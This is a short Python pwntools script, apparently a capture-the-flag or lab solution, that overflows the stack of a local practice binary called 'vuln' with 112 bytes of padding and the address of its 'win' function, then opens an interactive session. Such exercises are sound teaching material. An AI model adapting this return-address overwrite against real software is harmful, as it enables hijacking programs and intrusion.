#!/usr/bin/env python3

import argparse
import pwn

# Load the ELF
elf = pwn.ELF('./vuln')
p = elf.process()
print(elf)

# Receive and print the initial output from the process
print(p.recv().decode('utf-8'))

offset = 112

# Get the address of the 'win' function
new_eip = pwn.p32(elf.symbols['win'])

# Create the payload
payload = b'A' * offset + new_eip

# May cause the script to stall
# print(p.recv().decode('utf-8'))  # Optional message after sending

# Send the payload
p.sendline(payload)

# Pass to interactive mode
p.interactive()
